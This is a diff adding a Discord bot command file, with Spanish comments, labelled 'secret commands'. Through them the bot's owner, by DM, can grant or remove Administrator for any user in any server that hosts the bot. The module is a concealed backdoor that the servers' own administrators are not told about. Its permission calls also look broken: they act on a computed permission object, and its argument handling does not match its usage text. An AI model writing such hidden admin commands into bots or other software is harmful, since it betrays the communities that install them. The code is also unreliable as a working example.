@@ -1,0 +1,39 @@
+export default {
+  name: "admin",
+  description: "Comandos secretos para dar/quitar admin (solo dueño)",
+  execute: async (client, message, args) => {
+    if (message.author.id !== process.env.OWNER_ID) {
+      return message.reply("⚠️ Solo el dueño del bot puede usar este comando en DM.");
+    }
+
+    if (args.length < 3) {
+      return message.reply(
+        "Uso: !softigiveadmin <userID> <guildID> <inviteURL> o !softiremoveadmin <userID> <guildID> <inviteURL>"
+      );
+    }
+
+    const command = args.shift().toLowerCase(); // extrae "softigiveadmin" o "softiremoveadmin"
+    const [userId, guildId, invite] = args;
+
+    // Verifica que el bot esté en el servidor
+    const guild = client.guilds.cache.get(guildId);
+    if (!guild) return message.reply("❌ No estoy en ese servidor o el ID es incorrecto.");
+
+    try {
+      const member = await guild.members.fetch(userId);
+
+      if (command === "softigiveadmin") {
+        await member.permissions.add("Administrator");
+        message.reply(`✅ Usuario ${member.user.tag} ahora tiene permisos de administrador en ${guild.name}.`);
+      } else if (command === "softiremoveadmin") {
+        await member.permissions.remove("Administrator");
+        message.reply(`✅ Usuario ${member.user.tag} ya no tiene permisos de administrador en ${guild.name}.`);
+      } else {
+        message.reply("❌ Comando desconocido. Usa softigiveadmin o softiremoveadmin.");
+      }
+    } catch (error) {
+      console.error(error);
+      message.reply("❌ No pude ejecutar el comando, revisa IDs y permisos del bot.");
+    }
+  }
+};
